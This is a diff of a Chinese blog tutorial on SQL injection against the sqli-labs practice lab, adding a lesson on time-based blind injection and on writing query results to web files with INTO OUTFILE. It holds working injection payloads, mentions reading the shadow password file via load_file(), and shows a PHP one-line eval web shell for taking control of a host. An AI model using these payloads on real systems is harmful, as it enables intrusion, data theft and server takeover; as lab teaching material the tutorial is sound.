@@ -61,6 +61,19 @@
 <h1 id="第六课：基于时间的盲注"><a href="#第六课：基于时间的盲注" class="headerlink" title="第六课：基于时间的盲注"></a>第六课：基于时间的盲注</h1><p>基于时间的盲注与布尔盲注本质是一样的，通过构造特殊的注入使得产生不同的结果，然后判断条件的真假。例如：<br><code>1&#39; and if((select database()) like &#39;s%&#39;,sleep(5),null)--+</code></p>
 <p>若条件正确，则会执行后面的<code>sleep()</code>函数，所以表现的状态是浏览器不会立即得到响应，而是需要等待一段时间，所等待的时间则是sql语句查询时执行休眠函数的时间。其他查询例如：<br><code>1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39;,sleep(5),null)--+</code></p>
 <p>盲注需要大量的测试用例去猜测正确的结果，往往需要编写一些脚本来实现，实际运用中，大可以使用工具来辅助我们完成，SQL注入神器<a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a>，用python编写，简单实用，能检测许多的sql注入点并且帮助完成爆库的工作。</p>
+<h1 id="第七课：导出数据库至文件"><a href="#第七课：导出数据库至文件" class="headerlink" title="第七课：导出数据库至文件"></a>第七课：导出数据库至文件</h1><p>mysql中有关键字<code>outfile</code>能将输出的结果导入至文件，同时<code>dumpfile</code>能将一行结果导入至文件，利用这个特性，可以构造语句使得虽然无法利用页面获得信息，但可以写入文件并用网页访问该文件。</p>
+<p>首先打开Less7，还是一样的办法，构造能够注入的语句，加上单引号、双引号、反斜杠、括号、注释等，找到可以用于注入的语句，发现<code>id=1&#39;)) --+</code>可以注入，其他都仅显示语法错误。</p>
+<p><img src="/images/sqli/sqli_20160918211612.png" alt=""></p>
+<p>在mysql控制台中，使用文件导出语句，导出sql查询的内容。（因为在windows下，所以要用双斜杠表示一级目录）<br><code>select * from users into outfile &quot;C:\\wamp64\\www\\test\\test.txt&quot;</code></p>
+<p><img src="/images/sqli/sqli_20160918212035.png" alt=""></p>
+<p>可得到该文件在指定目录中的内容，需要注意的是如果指定文件路径存在，则无法覆盖文件会报错无法导出。</p>
+<p><img src="/images/sqli/sqli_20160918212507.png" alt=""></p>
+<p>另外，还可以用函数<code>load_file()</code>读取文件内容并导出结果至指定文件中，可以想象如果是linux系统就可以利用这种方法导出<code>shadow</code>文件获取系统账号密码。</p>
+<p><img src="/images/sqli/sqli_20160918213059.png" alt=""></p>
+<p>于是，当我们知道了服务器目录时，可以将查询结果导入至可访问的绝对路径下，然后通过访问则可获取该数据库的内容，同时也可以构造例如<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>这样的一句话shell来控制和攻击目标主机。</p>
+<p><code>1&#39;)) union select 1,2,3 into outfile &quot;C:\\wamp64\\www\\test\\union.txt&quot; --+</code><br><img src="/images/sqli/sqli_20160918214004.png" alt=""></p>
+<p><code>-1&#39;)) union select &quot;&quot;,&quot;hello&quot;,&quot;&lt;b&gt;world&lt;/b&gt;&quot; into outfile &quot;C:\\wamp64\\www\\test\\hello.php&quot; --+</code><br><img src="/images/sqli/sqli_20160918214855.png" alt=""></p>
+<p>其他的包括前面文章中提到的爆库方法中的查询语句都可以用于此处将查询结果导入至文件然后访问获取。另外，将<code>outfile</code>换成<code>dumpfile</code>也可以导入至文件，但是<code>dumpfile</code>一次只能导入一行结果，即每次查询结果只能有一行才可以用该关键字。</p>
 <hr>
 ]]></content>
     </entry>
